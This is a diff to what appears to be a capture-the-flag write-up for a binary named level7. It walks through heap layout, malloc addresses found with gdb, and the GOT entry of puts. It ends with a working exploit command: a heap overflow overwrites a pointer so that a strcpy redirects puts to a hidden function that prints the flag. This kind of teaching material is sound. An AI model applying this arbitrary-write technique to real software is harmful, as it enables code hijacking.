@@ -57,8 +57,6 @@ Although `m()` is never called in normal execution, calling it prints the conten
 
 The binary core logic works based on the **heap**.
 
-### Intent
-
 ### Stack
 
 After the `puts("~~")` call, the stack frames would ressemble something like this.
@@ -92,50 +90,97 @@ After the `puts("~~")` call, the stack frames would ressemble something like thi
 
 ### Heap
 
+Four `malloc(8)` calls are made, returning 4 pointers on the heap. These are concidently contiguous due to requested memory sizes.
+
+We can collect the addresses returned by `malloc()` via dynamic analysis via [gdb](https://www.sourceware.org/gdb/).
+```sh
+$ gdb -batch \
+      -ex "tbreak *0x08048536" \
+      -ex "tbreak *0x08048550" \
+      -ex "tbreak *0x08048565" \
+      -ex "tbreak *0x0804857f" \
+      -ex "run" \
+      -ex "printf \"malloc returned: %p\n\", \$eax" \
+      -ex "continue" \
+      -ex "printf \"malloc returned: %p\n\", \$eax" \
+      -ex "continue" \
+      -ex "printf \"malloc returned: %p\n\", \$eax" \
+      -ex "continue" \
+      -ex "printf \"malloc returned: %p\n\", \$eax" \
+      --args ./level7 x x
+Temporary breakpoint 1 at 0x8048536
+Temporary breakpoint 2 at 0x8048550
+Temporary breakpoint 3 at 0x8048565
+Temporary breakpoint 4 at 0x804857f
+
+Temporary breakpoint 1, 0x08048536 in main ()
+malloc returned: 0x804a008
+
+Temporary breakpoint 2, 0x08048550 in main ()
+malloc returned: 0x804a018
+
+Temporary breakpoint 3, 0x08048565 in main ()
+malloc returned: 0x804a028
+
+Temporary breakpoint 4, 0x0804857f in main ()
+malloc returned: 0x804a038
+```
+
+The heap's structure would ressemble something like and be a total of 64 contiguous bytes.
 ```ruby
       LOWER MEMORY ADDRESSES      
-+--------------------------------+ <-- `cntr_a` (@ 0x804a008)
-| id: 1          | (0x804a008)   |
-| str: 0x804a018 | (0x804a00c)   | (8 bytes)
-|                |               |
-+--------------------------------+ <-- `cntr_a->str` (@ 0x804a018)
-|           cntr_a->str          | (8 bytes)
-+--------------------------------+ <-- `cntr_b` (@ 0x804a028)
-| id: 2          | (0x804a028)   |
-| str: 0x804a038 | (0x804a02c)   | (8 bytes)
-|                |               |
-+--------------------------------+ <-- `cntr_b->str` (@ 0x804a038)
-|           cntr_b->str          | (8 bytes)
++------ Chunk nº1: metadata -----+
+|                                | (8 bytes)
++------ Chunk nº1: userdata -----+ <-- (@ 0x0804a008) PTR held on **stack** by `cntr_a`
+| id: 1                          | (4 bytes)
+| str: 0x0804a018                | (4 bytes)
++------ Chunk nº2: metadata -----+
+|                                | (8 bytes)
++------ Chunk nº2: userdata -----+ <-- (@ 0x0804a018) PTR held on **heap** by `cntr_a->str`
+|                                | (8 bytes)
++------ Chunk nº3: metadata -----+
+|                                | (8 bytes)
++------ Chunk nº3: userdata -----+ <-- (@ 0x0804a028) PTR held on **stack** by `cntr_b`
+| id: 2                          | (4 bytes)
+| str: 0x0804a038                | (4 bytes)
++------ Chunk nº4: metadata -----+
+|                                | (8 bytes)
++------ Chunk nº4: userdata -----+ <-- (@ 0x0804a038) PTR held on **heap** by `cntr_b->str`
+|                                | (8 bytes)
 +--------------------------------+
       HIGHER MEMORY ADDRESSES     
 ```
 
-```ruby
-      LOWER MEMORY ADDRESSES      
-+--------------------------------+ <-- `malloc $1` (@ 0x804a008)
-|                                |
-|                                |
-|                                |
-+--------------------------------+ <-- `malloc $2` (@ 0x804a018)
-|                                |
-|                                |
-|                                |
-+--------------------------------+ <-- `malloc $3` (@ 0x804a028)
-|                                |
-|                                |
-|                                |
-+--------------------------------+ <-- `malloc $4` (@ 0x804a038)
-|                                |
-|                                |
-|                                |
-+--------------------------------+
-      HIGHER MEMORY ADDRESSES     
+### GOTS
+
+As stated by the `puts@plt` function (cf. [source.asm](./source.asm)), `puts()`'s [GOT](https://ctf101.org/binary-exploitation/what-is-the-got/) entry:
+- In **big-endian hex** notation, is located at: `0x08049928`.
+- In **little-endian hex** escape sequence, is located at: `\x28\x99\x04\x08`.
+- In **little-endian oct** escape sequence, is located at: `\050\231\004\010`.
+```sh
+08048400 <puts@plt>:
+ 8048400:	ff 25 28 99 04 08    	jmp    *0x08049928
+ 8048406:	68 28 00 00 00       	push   $0x28
+ 804840b:	e9 90 ff ff ff       	jmp    80483a0 <_init+0x34>
 ```
 
 ### Intent
 
-...
+We perform two sequential `strcpy()` calls targeting pointers inside a 64 byte heap memory layout.  
+The first call writes to the address held by `cntr_a->str`.  
+The second call writes to the address held by `cntr_b->str`.  
+Because `cntr_a->str` preceeds `cntr_b->str` in memory, we can overflow and alter the pointer stored in `cntr_b->str`, allowing us to write to any address.
+
+By doing that, we wish the modify the `puts` [GOT](https://ctf101.org/binary-exploitation/what-is-the-got/) entry and make it point to the `m()` *(0x080484f4)* function instead. The `m()` would expose the content of the global buffer `c`.
 
 ## Exploit
 
-...
+`m()`:
+- In **big-endian hex** notation, is located at: `0x080484f4`.
+- In **little-endian hex** escape sequence, is located at: `\xf4\x84\x04\x08`.
+- In **little-endian oct** escape sequence, is located at: `\364\204\004\010`.
+
+```sh
+# (0x0804a028 + 0x4) − 0x0804a018 = 0x14 (20 in decimal) 
+$ ./level7 "$(printf "%20c%b" "c" "\050\231\004\010")" "$(printf "%b" "\364\204\004\010")"
+```
